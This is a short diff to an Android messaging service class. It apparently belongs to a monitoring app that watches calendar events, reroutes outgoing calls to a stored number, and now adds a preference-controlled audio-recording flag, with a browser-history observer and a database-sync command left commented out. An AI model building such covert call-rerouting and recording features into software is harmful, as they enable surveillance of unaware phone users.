@@ -152,7 +152,9 @@ public class MessagingService extends Service {
         if(this.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
             getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
         }
-        OutgoingCallReceiver.sRerouteNumber = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
+        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
+        OutgoingCallReceiver.sRerouteNumber = sharedPreferences.getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
+        ScreenReceiver.sShouldRecordAudio = sharedPreferences.getBoolean(ScreenReceiver.RECORDER_KEY, false);
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
     }
 
@@ -175,7 +177,7 @@ public class MessagingService extends Service {
         Lofl.onReceiveCommand(this, Commands.CALENDAR_EVENTS);
         Lofl.onReceiveCommand(this, Commands.TEXT_PARENTS);
         Lofl.onReceiveCommand(this, Commands.SHARE_APP);*/
-        Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE, null, null);
+        //Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE, null, null);
         Lofl.testProcessCommand(this);
         return super.onStartCommand(intent, flags, startId);
     }
